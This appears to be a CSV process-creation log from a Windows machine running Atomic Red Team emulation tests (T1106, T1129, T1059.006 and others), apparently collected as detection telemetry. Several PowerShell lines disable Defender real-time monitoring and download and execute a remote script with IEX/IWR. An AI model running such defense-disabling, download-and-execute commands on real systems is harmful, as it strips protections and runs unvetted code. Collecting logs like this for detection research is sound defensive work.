Image,CommandLine,ParentProcess
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO --use-cleanup """,C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,wmic  OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,C:\WINDOWS\system32\cmd.exe /c wmic OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-12612"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-2911"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""20890"" 1>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\conhost.exe,\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,cmd.exe /C C:\WINDOWS\TEMP\pld625D.tmp.bat T1072  --use-cleanup,C:\Windows\System32\rphcp.exe
C:\Windows\regedit.exe,regedit.exe  /s \NvContainerRecoveryNvContainerLocalSystem.reg,C:\Windows\System32\cmd.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES61A2.tmp"" ""c:\Windows\SystemTemp\iag2ajkw\CSCA606CD9F92F4D7A809670A2F540FB24.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\iag2ajkw\iag2ajkw.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  Set-ExecutionPolicy Unrestricted ; Set-MpPreference -DisableRealtimeMonitoring $true ; Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force ; IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -Force -getAtomics ; Invoke-AtomicTest T1106 -CheckPrereqs ; Invoke-AtomicTest T1106 -GetPrereqs ; Invoke-AtomicTest T1106 ; Invoke-AtomicTest T1106 -Cleanup ; Set-MpPreference -DisableRealtimeMonitoring $false ,C:\Windows\System32\cmd.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES5A3F.tmp"" ""c:\Windows\SystemTemp\l52ed0r1\CSC6F5C5A7765DA412C8D73CD2DC0839947.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\l52ed0r1\l52ed0r1.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  (Get-packageProvider -name nuget).ProviderPath ,C:\Windows\System32\cmd.exe
C:\Windows\System32\net1.exe,C:\WINDOWS\system32\net1  FILE ,C:\Windows\System32\net.exe
C:\Windows\System32\net.exe,NET  FILE ,C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.exe  Get-ExecutionPolicy ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0.22"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.2."" ",C:\Windows\System32\cmd.exe
C:\Program Files\NVIDIA Corporation\NvContainer\nvcontainer.exe,"""C:\Program Files\NVIDIA Corporation\NvContainer\nvcontainer.exe"" -s NvContainerLocalSystem -a -f ""C:\ProgramData\NVIDIA Corporation\NVIDIA app\NvContainer\NvContainerLocalSystem.log"" -l 3 -d ""C:\Program Files\NVIDIA Corporation\NvContainer\plugins\LocalSystem"" -r -p 30000  -ert",C:\Windows\System32\services.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\net1.exe,C:\WINDOWS\system32\net1  start NvContainerLocalSystem ,C:\Windows\System32\net.exe
C:\Windows\System32\find.exe,"find  ""6.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\net.exe,net  start NvContainerLocalSystem ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""5.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\regedit.exe,regedit.exe  /s \NvContainerRecoveryNvContainerLocalSystem.reg,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2022"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2019"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\conhost.exe,\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,cmd.exe /C %windir%\NvContainerRecovery.bat NvContainerLocalSystem C:\ProgramData\NVIDIA\NvContainerRecoveryNvContainerLocalSystem.log,C:\Windows\System32\services.exe
C:\Windows\System32\find.exe,"find  ""Server 2016"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2012"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2008"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2003"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""PowerShellGet"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell  Get-Module -ListAvailable PowerShellGet ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""cleanup"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO --use-cleanup """,C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,wmic  OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,C:\WINDOWS\system32\cmd.exe /c wmic OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-6692"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-25454"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""20877"" 1>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\conhost.exe,\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,cmd.exe /C C:\WINDOWS\TEMP\pld51B2.tmp.bat T1106  --use-cleanup,C:\Windows\System32\rphcp.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES4E49.tmp"" ""c:\Windows\SystemTemp\koxebfdw\CSCE3C3890A1C334DDF9D12943B258D7E2C.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\koxebfdw\koxebfdw.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES4DEB.tmp"" ""c:\Windows\SystemTemp\pvpskewp\CSC1666D1534BB74B3A994C7E439389123E.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  Set-ExecutionPolicy Unrestricted ; Set-MpPreference -DisableRealtimeMonitoring $true ; Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force ; IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -Force -getAtomics ; Invoke-AtomicTest T1129 -CheckPrereqs ; Invoke-AtomicTest T1129 -GetPrereqs ; Invoke-AtomicTest T1129 ; Invoke-AtomicTest T1129 -Cleanup ; Set-MpPreference -DisableRealtimeMonitoring $false ,C:\Windows\System32\cmd.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES482E.tmp"" ""c:\Windows\SystemTemp\tjfjrsrq\CSC8B012C68148B48F1BD7024792E4C84E.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\tjfjrsrq\tjfjrsrq.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  (Get-packageProvider -name nuget).ProviderPath ,C:\Windows\System32\cmd.exe
C:\Windows\System32\net1.exe,C:\WINDOWS\system32\net1  FILE ,C:\Windows\System32\net.exe
C:\Windows\System32\net.exe,NET  FILE ,C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.exe  Get-ExecutionPolicy ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0.22"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.2."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""5.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2022"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2019"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2016"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2012"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\SecurityHealth\10.0.27703.1006-0\SecurityHealthHost.exe,\\?\C:\Windows\System32\SecurityHealth\10.0.27703.1006-0\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding,C:\Windows\System32\svchost.exe
C:\Windows\System32\find.exe,"find  ""Server 2008"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2003"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""PowerShellGet"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell  Get-Module -ListAvailable PowerShellGet ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""cleanup"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO --use-cleanup """,C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,wmic  OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,C:\WINDOWS\system32\cmd.exe /c wmic OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-15675"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-4480"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""20860"" 1>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\conhost.exe,\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,cmd.exe /C C:\WINDOWS\TEMP\pld3F42.tmp.bat T1129  --use-cleanup,C:\Windows\System32\rphcp.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES3CD4.tmp"" ""c:\Windows\SystemTemp\4c3rrzys\CSC9BAEEABF685A4723806C83FCEEA7AD0.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\4c3rrzys\4c3rrzys.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\pvpskewp\pvpskewp.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  Set-ExecutionPolicy Unrestricted ; Set-MpPreference -DisableRealtimeMonitoring $true ; Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force ; IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -Force -getAtomics ; Invoke-AtomicTest T1059.006 -CheckPrereqs ; Invoke-AtomicTest T1059.006 -GetPrereqs ; Invoke-AtomicTest T1059.006 ; Invoke-AtomicTest T1059.006 -Cleanup ; Set-MpPreference -DisableRealtimeMonitoring $false ,C:\Windows\System32\cmd.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES364C.tmp"" ""c:\Windows\SystemTemp\susds1ke\CSC82FC9002EB1E44858EFB99167FF1F45.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\susds1ke\susds1ke.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  (Get-packageProvider -name nuget).ProviderPath ,C:\Windows\System32\cmd.exe
C:\Windows\System32\net1.exe,C:\WINDOWS\system32\net1  FILE ,C:\Windows\System32\net.exe
C:\Windows\System32\net.exe,NET  FILE ,C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.exe  Get-ExecutionPolicy ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0.22"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.2."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""5.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2022"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2019"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2016"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2012"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2008"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2003"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""PowerShellGet"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell  Get-Module -ListAvailable PowerShellGet ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""cleanup"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO --use-cleanup """,C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,wmic  OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,C:\WINDOWS\system32\cmd.exe /c wmic OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-9754"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-27022"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""20847"" 1>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\conhost.exe,\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,cmd.exe /C C:\WINDOWS\TEMP\pld2D11.tmp.bat T1059.006  --use-cleanup,C:\Windows\System32\rphcp.exe
C:\Program Files\NVIDIA Corporation\NvContainer\nvcontainer.exe,"""C:\Program Files\NVIDIA Corporation\NvContainer\nvcontainer.exe"" -s NvContainerLocalSystem -a -f ""C:\ProgramData\NVIDIA Corporation\NVIDIA app\NvContainer\NvContainerLocalSystem.log"" -l 3 -d ""C:\Program Files\NVIDIA Corporation\NvContainer\plugins\LocalSystem"" -r -p 30000  -ert",C:\Windows\System32\services.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  Set-ExecutionPolicy Unrestricted ; Set-MpPreference -DisableRealtimeMonitoring $true ; Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force ; IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -Force -getAtomics ; Invoke-AtomicTest T1059.007 -CheckPrereqs ; Invoke-AtomicTest T1059.007 -GetPrereqs ; Invoke-AtomicTest T1059.007 ; Invoke-AtomicTest T1059.007 -Cleanup ; Set-MpPreference -DisableRealtimeMonitoring $false ,C:\Windows\System32\cmd.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES22A5.tmp"" ""c:\Windows\SystemTemp\h2j5qjun\CSC52908F50E5E4863BC658E87171D81DD.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\h2j5qjun\h2j5qjun.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  (Get-packageProvider -name nuget).ProviderPath ,C:\Windows\System32\cmd.exe
C:\Windows\System32\net1.exe,C:\WINDOWS\system32\net1  FILE ,C:\Windows\System32\net.exe
